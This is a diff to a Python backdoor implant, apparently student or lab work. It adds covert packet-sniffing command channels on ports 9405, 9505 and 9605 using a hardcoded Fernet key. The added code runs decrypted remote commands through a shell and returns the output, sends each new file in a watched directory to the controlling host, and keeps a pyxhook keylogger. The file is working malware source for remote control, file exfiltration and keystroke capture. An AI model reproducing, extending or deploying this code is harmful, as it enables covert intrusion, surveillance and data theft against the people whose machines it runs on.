@@ -1,16 +1,54 @@
-import sys,os, subprocess
+import sys,os, subprocess, time
 #from scapy.all import *
 import socket
+from scapy.all import *
 from Dependencies import pyxhook
 from cryptography.fernet import Fernet
+from watchdog.observers import Observer
+from watchdog.events import LoggingEventHandler
+
+# for exfil https://github.com/dsoprea/PyInotify
+
+# fork this server 3 ways - 1 for keylogger extraction, 2 for backdoor, and 3 for exfilteration 
+
 
 TCP_IP = ''
 TCP_PORT = 8045
 TCP_EXFIL=8046
 log_file='/home/darthvader/Documents/file.log'
 key = b'EzBmzsJH6VogpmXpxI-bJS8xXgXMGgC2T_How8q24_w='
+host=''
 
+pcap_filter="tcp[tcpflags] & (tcp-ack)==0 && (tcp dst port 9405 ||tcp dst port 9505)"
+#pcap_filter="tcp dst port 9405 ||tcp dst port 9506"
+
+class Event(LoggingEventHandler):
+	def on_created(self, event):
+		global host
+		print("Doh")
+		efile=event.src_path.decode()
+		print(efile)
+		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		s.connect((host,TCP_EXFIL))
+		print("Exfil connected")
+		f = open (efile, "rb")
+		l = f.read(1024)
+		while (l):
+			s.send(l)
+			l = f.read(1024)
+		s.close()
+		#start tcp connection to send file that has been created
+		
+
+def sendend(data, sport, dport, server):
+    global Bflag
+    pkt=IP(dst=server)/TCP(dport=dport,sport=sport,seq=1048577)/Raw(load=cipher.encrypt_str(data))
+    send(pkt, verbose=False)
+    #Bflag="a"
 #code to initialize and run keylogger
+
+
+
 def OnKeyPress(event):
   fob=open(log_file,'a')
   fob.write(event.Key)
@@ -19,6 +57,7 @@ def OnKeyPress(event):
   if event.Ascii==96: #96 is the ascii value of the grave key (`)
     fob.close()
     new_hook.cancel()
+
 #instantiate HookManager class
 new_hook=pyxhook.HookManager()
 #listen to all keystrokes
@@ -48,16 +87,52 @@ def sendchoice(choices):
     print ("You chose: " + str(choices))
 
 def decryptmsg(crypt):
+	print(crypt)
+	if not crypt: 
+		print("Blank received") 
+	else:
+		f=Fernet(key)
+		token=f.decrypt(crypt)
+		return token
+
+def encryptmsg(crypt):
 	f=Fernet(key)
-	token=f.decrypt(crypt)
+	token=f.encrypt(crypt.encode())
 	return token
 
-def exfil():
+def exfil(pkt):
+	global host
 	print("In Exfil")
-	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	s.bind((TCP_IP, TCP_EXFIL))
-	s.listen(1)
-	conn, addr = s.accept()
+	#s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	#s.bind((TCP_IP, TCP_EXFIL))
+	#s.listen(1)
+	#conn, addr = s.accept()
+	#print("Exfil connected")
+	#start monitoring path
+	#var = conn.recv(1024).strip()
+	print("path received")
+	#print(path)
+	path=decryptmsg(pkt[Raw].load)
+	host=pkt.getlayer(IP).src
+	observer = Observer()
+	event_handler=Event()
+	observer.schedule(event_handler, path, recursive=False)
+	observer.start()
+	try:
+		while True:
+			time.sleep(1)
+	except KeyboardInterrupt:
+		observer.stop()
+	print("starting observer")
+	observer.join()
+	print("Observer completed")
+	#s.close()
+	exit(0)
+	#if new file is created then send it 
+
+def sendfile(name):
+	print ("sending file")
+	print(name.src_path())
 
 def bakdoor():
 	print("In backdoor")
@@ -75,6 +150,44 @@ def kill_backdoor():
 def kill_client():
     print("Killing client")
 
+def backdoorcmd(pkt):
+	print("In backdoor")
+	data=decryptmsg(pkt[Raw].load)
+	proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) #This command runs processes. 
+	stdoutput = proc.stdout.read() + proc.stderr.read()
+	edata=encryptmsg(stdoutput.decode())
+	sendpkt(edata,pkt.getlayer(TCP).dport,pkt.getlayer(TCP).sport,pkt.getlayer(IP).src)
+
+def sendpkt(data, sport, dport, server):	
+	####craft packet####
+	pkt=IP()/TCP()/Raw()
+	pkt.getlayer(IP).dst=server
+	pkt.getlayer(TCP).sport=sport
+	pkt.getlayer(TCP).dport=dport
+	pkt.getlayer(Raw).load=data.strip()
+	ls(pkt)
+	send(pkt, verbose=False)
+	
+	
+def RecevePackets(pkt):
+	#check if the packet is for the backdoor, exfil, keylog
+	print ("packet received")
+	time.sleep(2)
+	if pkt.haslayer(TCP):
+		if pkt.getlayer(TCP).dport==9405: #if port is 8405 it is for backdoor. execute the command and send back the output and listen for further commands
+			if pkt[TCP].seq == 1048577:
+				ip=pkt[IP].src
+				#UndoKnock(ip)
+				Bflag="a"
+			else :
+				backdoorcmd(pkt)
+		if pkt.getlayer(TCP).dport==9505: #if port is 8505 it is for exfil. monitor the directory and send any new files back to client and listen for further commands
+			exfil(pkt)
+		if pkt.getlayer(TCP).dport==9605:#if port is 8605 it is for keylogger. send keylog file from path set above and listen for further commands
+			keylogger()
+
+
+
 def listener():
 	print("In Listener")
 	BUFFER_SIZE = 10000
@@ -89,17 +202,21 @@ def listener():
 	#############
 	while 1:
 		data = decryptmsg(conn.recv(1024).strip())        # read the client message
-		print(data.decode())
-		if data.decode()=="exit": conn.sendall(("closing backdoor").encode())
-		elif data.decode()=="exfil":exfil()
-		elif data.decode()=="keylogger":keylog()
+		if data=="".encode() : break
+		elif data=="exit".encode(): conn.sendall(encryptmsg("closing backdoor"))
+		elif data=="exfil".encode():exfil()
+		elif data=="keylogger".encode():keylog()
 		elif not data: break                  # Echo it back
 		else:
+			print(data.decode())
 			proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) #This command runs processes. 
 			stdoutput = proc.stdout.read() + proc.stderr.read()
 			#print(stdoutput.decode())
 			###Add encryption here###
-			conn.sendall(stdoutput)
+			conn.sendall(encryptmsg(stdoutput.decode()))
 	#exit 
-	conn.close()
-listener()
+	s.close()
+	exit(0)
+	
+#listener()
+sniff(filter=pcap_filter,prn=RecevePackets)
